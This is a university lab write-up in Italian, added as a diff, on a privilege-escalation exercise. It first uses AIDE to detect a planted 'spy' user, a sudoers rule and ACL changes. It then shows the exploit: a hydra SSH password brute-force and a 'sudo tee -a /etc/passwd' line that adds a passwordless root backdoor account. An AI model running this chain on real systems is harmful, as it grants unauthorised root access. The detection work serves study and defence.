@@ -1,0 +1,183 @@
+# Nome: Davide Chirichella
+# Matricola: 0001071414
+# Esercizio: privilege escalation
+
+# DETECTION ==============================================================================
+
+Lo strumento che utilizzerò è "aide" (Advanced Intrusion Detection Environment), uno strumento 
+che monitora l'integrità dei file di sistema, confrontandone lo stato attuale con una "fotografia" iniziale per 
+rilevare modifiche non autorizzate.
+
+1. Imposto su /etc/aide/aide.conf la direttiva per indicare tutte le cartelle potenzialmente modificabili.
+In questo caso, come da traccia:
+
+# @@x_include /etc/aide/aide.conf.d ^[a-zA-Z0-9_-]+$ da commentare...
+
+/usr/bin  f  Full
+/etc/    f Full
+
+2. Avvio aide per fare una "fotografia" dello stato attuale del mio sistema mediante il comando:
+
+sudo aideinit
+
+Potrebbe essere necessario copiare a mano il database con
+
+mv /var/lib/aide/aide.db.new /var/lib/aide/aide.db
+
+3. Lancio una scansione con "aide -C -c /etc/aide/aide.conf"
+
+4. Eseguo il programma vulnerabile
+
+5. Eseguo nuovamente una scansione con "aide -C -c /etc/aide/aide.conf"
+
+3. Noto, anche mediante i comandi "getcap" e "getfacl", che il binario fornito ha effettuato le seguenti operazioni:
+
+File: /etc/group
+ Size      : 1389                             | 1401
+ Mtime     : 2025-05-08 12:38:17 -0400        | 2025-06-22 09:35:49 -0400
+ Ctime     : 2025-05-08 12:38:17 -0400        | 2025-06-22 09:35:49 -0400
+ SHA256    : Fh9ydcJNFY9s41Ob4Jj/7R9m8YqBXSKB | k/u/dqpC7GhrFCIMOG5Qtxl4bO90HDT7
+             OL79/qdkB1M=                     | myvIYGnQHQU=
+ SHA512    : 5cCWtaSBTcXc+QHBOdAvtWgW7RGNQ4vK | Php5GcXOgnQky4ciS1viY+NO7jtWsK3U
+             a9aOJ8oBy4O+fE74qQ1YassC/nepeTvn | PWBPY+P8dJymUkokImkR4TlQo6HKyuQ0
+             lRjpJOtZjS8m6ZRFwP+pAA==         | tFhPg0rl6gEZyzgN8QvFSw==
+ STRIBOG256: 0/Vk4T5DXNNyMzxOH6NENQiOUZPhA+w8 | 8dK9w+RBZMkYuqQ5QHyiKUtdTPwAZK+Z
+             VDL8Ixbaibk=                     | G6PAEeD1oKo=
+ STRIBOG512: 6KmrGq1fSJ7FLn72J1AE/fyqZA50cW65 | PiKLXjA10g4xv6+Mwh2sr/8NZbkCJ1IZ
+             G93b15/oX7APbCdePI2DJ0Bxh3Li9FwP | iqlpplGTOGH3Qa7VKhqFk2ccJjsMaYy1
+             qOG9Oy7bQdd0lAr/Usez1w==         | 1qGuKYrlHjrEImokdSqW4A==
+ SHA512/256: tsD/fPewR4ETelpFUIoD7Tf8PFXthxvR | LCG5t0eFQPHVF7X1RbV7p3Sy5T55t6Oc
+             JBMUtcNaTCU=                     | 946epW23oOo=
+ SHA3-256  : Fyu2LclQnBkc4fls5VOVOEz0GbPC2KlQ | CaPjrT4gz51MAnZe3kKn+B3N8FvDM5iN
+             tlo76gLIwyc=                     | f6M/ebxwUQU=
+ SHA3-512  : 0u6XLoIHKjTrzjRUpl0J1np+kv+IPNgD | WU7ONUHQXYFTp13eKAknk5H8821VCLq8
+             sDEbSzOdewYtFNpzGGLugzri/LuBB717 | c6c1ocrWfmSIz4l/CrwvDItyassPnfY7
+             zTLuAHvQAWbQuQXqrZQvcA==         | nv7d3xLAkWe47GymiGvYXQ==
+             
+- File modificato, è stato aggiunto un gruppo spy con gid 5243
+
+File: /etc/passwd
+ Size      : 3512                             | 3544
+ Mtime     : 2025-05-07 13:21:50 -0400        | 2025-06-22 09:35:49 -0400
+ Ctime     : 2025-05-07 13:21:50 -0400        | 2025-06-22 09:35:49 -0400
+ SHA256    : vZ/dRgF8Y1W6N8m1g0kqRrfiGtmNM5Vq | PjdHW1CFfCMF3Nm7Ifdvfc1r1lWSTIgx
+             hn5+eI8Ppn0=                     | ubLC2fp6NhE=
+ SHA512    : s62bwYsh69q8p+3WiDhYwXLTKTk17lKZ | oesv7hU78CyMFrwJh0dlbuxUsPuSUt9p
+             kkyt/B/B6aEkL6lb0viM2ODRXkQPuE32 | xkrOOeJi0x9vbb1lwCSGtIIz/Uzd6D9E
+             RpNNe3RuwMcAuKZPQ6eTYA==         | XjdKZOc7bJDdUUIvpTdh/w==
+ STRIBOG256: x4gmy0p48hS7qkUsrYjYO7bf2WsT7kOg | BRKJMejQegT68bSMHk0IUHBALTH3no0h
+             v3SzIaVT99k=                     | o1kU2yT+788=
+ STRIBOG512: zjPZdmhCVjRyL1X3rlGANDGyW5VF55aL | 20fs85U41iS89j127KN0FpXjPTZBjJVG
+             bjFaMj+emYW5WTpnsxSZ6YcR8Vt72f74 | Mqevsph++/MqpM+HkvbxtczuU/o0uIOK
+             2XGANSPRvhEbWcgHkT+Rrg==         | sjr71vcBRnAbZwYZxmhHBg==
+ SHA512/256: vlfX9+gjdmIIuXJVjusEFcYTsydDQ4s4 | pfDOxrU5nIaNwJewchgdUilmYjISkyfT
+             hNK1cv0jvSk=                     | HpAe2TmzyzQ=
+ SHA3-256  : FXNFhD5Pd/X9FafLdGg+KBdEPf+eaLvd | lKOxlcZbBJf6Ocr6VPRd3z2y9S+KclrW
+             fNvoJd9Ma6E=                     | FAWwKTGBDeI=
+ SHA3-512  : QF/Rih3YTSk7tyRzXddiSfuFRnhkd6QC | Na0z1VbmGTQTvIVql2vq2Vd6A0hcCXjT
+             J7MqFWwVgnlc2rFcdudUbkqxj6OowNST | IBTZABizUCkwQQetDs/PTChnudIiYlW7
+             fgLxYltL8icM5lC9dfh+GQ==         | tAZVUnjrhlkjGKpPng/DwQ==
+             
+- File modificato, è stato aggiunto un utente spy con uid 5243
+
+File: /etc/shadow
+ Size      : 1536                             | 1633
+ Mtime     : 2025-05-07 13:21:50 -0400        | 2025-06-22 09:35:49 -0400
+ Ctime     : 2025-05-07 13:21:50 -0400        | 2025-06-22 09:35:49 -0400
+ SHA256    : eLL4edvBdee5ztyeotzvyJLSFUwRPB/E | PZVgiaePuOhH9Z0Mjg8ojuL0cff1gbDE
+             +P4oXFdgaJc=                     | pm4QL73E8CQ=
+ SHA512    : skAYsZnN+OEq+tnrkHtAbhqhhxs0gKSy | b1T7+SFhibgWTTEDjjnrPwSpzNx+9qnP
+             g+5eZ8+W0fbi9PV/gBJmt4tiI3GD1qwd | klJC9N0+tgd7RW+Ux6vn4kioxdHuyzOQ
+             sHQoPjanTrP3LQp2NtWH8w==         | 7jy1c9584eiXWscwpbdmgg==
+ STRIBOG256: +pUIgXWJ+B4Ep+OPmZoFWgC71rvoM6Hy | CDXtomoe0XHOA1i8kE9PUbLCgY/8kjhz
+             yFw9CqHD4j0=                     | ZhiqKM2hyQo=
+ STRIBOG512: k4ffLfaiasofHBzhmJrPW6KTsEdjMoR4 | lgJ2dzX2oNonk6KU1O0qimWc7JUwTUsk
+             sJuLpwuQKmxDvZJUXhg93FDyueEsOx3h | OMb2UITMtE+nqEQYPxcvk1PA58v7Pzbg
+             xRq05umq1z+l0NNwlGTgQA==         | GLESwve1/4oXRpuf/bwkmg==
+ SHA512/256: OWC1KOslBKXjarbv8bKOpmX5pbdwejLd | z/8HkmjM2E6se+0HnlJyIe+hreHEiFuh
+             92oB6HY6oU8=                     | SsoneFuB4Vc=
+ SHA3-256  : gV0wkudYwUXYQ8wraP42asK+mH8f6S1z | fJ5kkvFReQfiCoxy7hudg6QSLfkpkQpA
+             rXkKsUb+PDo=                     | XiXReNyEElI=
+ SHA3-512  : XLYIz/nR7B5gC2gVmHTSbrtaPvY7zUeO | vkT/9hvC6GRfDhBeoftBTQvYr5xlmGtx
+             BUbHQX/PaA7R3l0BuD/+FFzdt/6hAdYM | MlWcveNsWnMHXt2g+EBxMMwksv+hxZXT
+             9i4+Sb8gziCpST2YZHBpHg==         | aAaoLMlJrao7n7Pv9zI1EA==
+             
+- È stata aggiunta una password all'utente spy
+
+File: /etc/sudoers
+ Size      : 1793                             | 1831
+ Mtime     : 2025-05-07 11:43:38 -0400        | 2025-06-22 09:35:49 -0400
+ Ctime     : 2025-05-07 11:43:38 -0400        | 2025-06-22 09:35:49 -0400
+ SHA256    : 6u5i+Tqk5EP19MyONvVYRbHa16SsVOft | Atu9kUsvtnY6hRwkTOFo0OqohD8RGFhQ
+             gxTsmncc0h8=                     | yMRXIKf2/AQ=
+ SHA512    : IQeCYHoqzmycwmfrOj4YoOqPp0/qe1XZ | aRcxa5kmN6C5yWd0IK6vNPJAQ7NTbtz+
+             qL8zG7yOecRq1er3bT60s9RSUr64vJ7z | ClvbVcDeAKBShIcfreULroltbZsudp/0
+             Y272Vdtjf8SlNTPgLjb7tA==         | rvHjG+lrBotDeDRL4CnE+Q==
+ STRIBOG256: je6P6gmDnx/ra40gHYEmjf+cisQFfFCv | ZdMmSXJ8csA88F3QPYhiu597vWFs2/9h
+             rxfG6DHHX0I=                     | DJ6FB6KpAI0=
+ STRIBOG512: 13bBNJtEwN6g7Tvb92/sG5PRia/WEUNp | w6XFE7CA5M2zi4ACBSQcn7SoghGdJVsk
+             t6W97/OSulfCcFfueXLI/8M/YPXbr9Gl | iaU8NI6uGydUZRQmnUtEt5rIWPEiJU/B
+             7cmHPiE19tt/gWsb6DxeCw==         | u9exunHcBTQNH8BkYud4Tg==
+ SHA512/256: i9Qb6f/39WxlQcry37+xq58BCTLDEb2C | S9yyf4dDZY3/RmQRswK22T0AJ91KuU7G
+             8gmdo15M0ds=                     | XDR+hEjlboI=
+ SHA3-256  : HgqQIFnfWyyu2P3O3vm5LluGUwOzUP2W | ioGltPGD22WirI7o/IhZfhGklLxyNdkf
+             CQQavZVpPcM=                     | bfABnr1VDz4=
+ SHA3-512  : 1yuhtGXW/CHUhH6vnJa+VHcSPouo0+ul | WhIUqSirm9fj1xyKdf2O0YSOaRjCjUhe
+             H9EGZ/lydNcXuoxsJcCPE/20DX3nWQL0 | WJc1Tvf+8LDuFImIIF6/azJjGR8254xn
+             S5tjIwmeM/m5YJ+iayGbQQ==         | XsgZ1DhZd9fqdkFjzjf8Zg==
+             
+- Aggiunta la riga: "spy ALL=(root) NOPASSWD: /usr/bin/tee" sul file sudoers, 
+il file che specifica quali operazioni un utente può fare con privilegi elevati (es. come root o altri utenti). 
+In questo caso, spy, da qualsiasi host senza inserire la password potrà eseguire /usr/bin/tee come root
+
+File: /usr/bin/chmod
+ Ctime     : 2024-11-30 09:21:25 -0500        | 2025-06-22 09:35:49 -0400
+ XAttrs    : num=0                            | num=1
+                                              | [1] security.capability <=> AAAA
+                                              | AgAAAAAAAAAAAAAAAAAAAAA=
+
+- Nessuna capability impostata
+
+File: /usr/bin/date
+ Ctime     : 2024-11-30 09:21:23 -0500        | 2025-06-22 09:35:49 -0400
+ XAttrs    : num=0                            | num=1
+                                              | [1] security.capability <=> AQAA
+                                              | AgAAAAAAAAAAIAAAAAAAAAA=
+
+- Impostata la capability cap_audit_read=ep, inutile al nostro scopo
+
+File: /usr/bin/tee
+ Perm      : -rwxr-xr-x                       | -rwxrwxr-x
+ Ctime     : 2024-11-30 09:21:20 -0500        | 2025-06-22 09:35:49 -0400
+ ACL       : A: user::rwx                     | A: user::rwx
+             A: group::r-x                    | A: user:spy:rw-
+             A: other::r-x                    | A: group::r-x
+                                              | A: mask::rwx
+                                              | A: other::r-x
+
+- Impostata nelle ACL (che permettono di definire permessi più granulari su file e cartelle):
+	- SPY rw-: conferisce all'utente "spy" permessi di lettura e scrittura,
+	permettendogli quindi di modificare il file
+
+# ATTACK =================================================================================
+
+1. Utilizzo di hydra per attaccare mediante wordlist l'utente aggiunto e fare il login
+`sudo systemctl start ssh` in caso in cui non fosse autorizzato l'accesso ssh è "concesso"
+attivarlo
+
+hydra -l spy -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1
+
+La password di spy è "qwerty", vi accedo con "su spy"
+
+2. Utilizzo di tee per aggiungere su /etc/passwd un utente con accesso privilegiato
+(backdoor) che può fare login senza password, avrà UID e GID di root (0 entrambi), 
+/root come home directory e /usr/bin/zsh come shell di login.
+
+Utilizzando infatti `sudo tee -a /etc/passwd` scrivo da standard input in append al file. 
+Inserisco la riga: 
+
+toor::0:0:root:/root:/usr/bin/zsh
+
+Facendo su toor, sono effettivamente root (uid=0 e gid=0) quindi lanciando id:
+
+uid=0(root) gid=0(root) groups=0(root)
